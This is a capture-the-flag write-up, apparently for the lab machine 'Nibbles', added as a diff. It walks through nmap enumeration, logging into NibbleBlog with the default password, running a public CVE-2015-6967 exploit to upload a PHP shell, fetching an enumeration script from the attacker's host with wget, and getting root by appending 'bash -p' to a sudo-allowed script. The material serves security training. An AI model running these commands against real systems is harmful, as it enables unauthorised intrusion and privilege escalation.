@@ -1,0 +1,88 @@
+#################################
+WebApp Enumeration
+Defauts creds "NibbleBlog"
+RCE remote shell for Nibble 4.0.3
+Monitor.sh mod script to become root:
+echo "bash -p" >> monitor.sh
+sudo -u root ./monitor.sh
+#################################
+
+1-Enumeration:
+    nmap -T5 -sV -sC -Pn 10.10.10.75 -oN enum/scan1.logs -vv
+    PORT      STATE    SERVICE         REASON      VERSION
+    22/tcp    open     ssh             syn-ack     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey: 
+    |   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
+    |   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
+    |   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
+    80/tcp    open     http            syn-ack     Apache httpd 2.4.18 ((Ubuntu))
+    |_http-server-header: Apache/2.4.18 (Ubuntu)
+    |_http-title: Site doesn't have a title (text/html).
+    | http-methods: 
+    |_  Supported Methods: GET HEAD POST OPTIONS
+
+
+    Port 80 in the code source we found:
+        http://10.10.10.75/nibbleblog/
+        http://10.10.10.75/nibbleblog/README
+
+        ===== Nibbleblog ======
+        Version: v4.0.3
+        Codename: Coffee
+        Release date: 2014-04-01
+        ===== System Requirements =====
+        * PHP v5.2 or higher
+
+        http://10.10.10.75/nibbleblog/admin/
+        Mr Nibbler is Cool!
+
+        http://10.10.10.75/nibbleblog/content/private/users.xml
+        admin
+
+        We will test admin + default password "nibbles"\
+
+
+
+2-Exploit:
+    We found an RCE to get a remote shell for Nibble 4.0.3:
+        https://github.com/dix0nym/CVE-2015-6967
+        python3 exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload shell.php
+
+    To get tty shell:
+        python -c 'import pty;pty.spawn("/bin/bash");'
+        OR
+        python3 -c 'import pty;pty.spawn("/bin/bash");'
+
+
+    Priv Esc Manually:
+        sudo -l <-- find monitor.sh
+            User nibbler may run the following commands on Nibbles:
+            (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+
+
+            Privilege Escalation SUID: <-- Nothing special
+                -Documentation: https://gtfobins.github.io/
+                find / -perm -u=s -type f 2>/dev/null 
+                    or
+                find / -perm +6000 2>/dev/null
+
+    Priv Esc Auto:
+            Linepeas or lenenum: <-- Just in case 
+                nibbler@Nibbles:/tmp$ wget http://10.10.16.28:8000/linenum.sh
+                Linux Nibbles 4.4.0-104
+                DISTRIB_DESCRIPTION="Ubuntu 16.04.3 LTS"
+
+
+    We will modify monitor.sh:
+        nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh
+
+        we can add a command at the end of the script:
+            echo "bash -p" >> monitor.sh
+            sudo -u root ./monitor.sh
+
+    NOW WE ARE ROOT
+
+
